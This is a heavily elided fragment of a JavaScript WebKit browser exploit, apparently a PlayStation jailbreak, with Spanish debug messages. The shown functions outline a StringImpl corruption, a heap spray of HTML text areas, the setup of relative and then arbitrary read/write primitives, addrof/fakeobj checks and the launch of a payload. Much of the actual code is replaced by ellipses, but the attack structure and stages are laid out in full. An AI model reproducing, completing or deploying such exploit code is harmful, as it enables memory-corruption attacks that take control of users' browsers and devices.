...
function setupRW() {
	...
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			...
			debug_log("[+] Consiguió con éxito una relativa R / W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] No se pudo configurar una primitiva R / W relativa");

	debug_log("[+] Configurando R / W arbitrario");
	...
	if (g_ab_slave === null)
		die("[!] No encontré la esclava JSArrayBufferView");
	...
	debug_log("[+] Probando R / W arbitrario");
	...
	debug_log("[+] Webkit Exploit finalizado con éxito");
	...
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Error al configurar las primitivas addrof / fakeobj");
	debug_log("[+] Lanzando carga útil, espere 20 segundos...");
        debug_log("[+] Youtube  SONYSNIGHTMARE ...");
...
/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("[+] Buscando el StringImpl ...");
	...
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("[+] StringImpl dañada con éxito");
	...
	debug_log("[+] Tengo una lectura relativa");
...
function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("[+] Se encontró un mensaje de validación falso");
...
function sprayHTMLTextArea() {
	debug_log("[+] Ejecutando Webkit Exploit, Paciencia PorFavor ...");
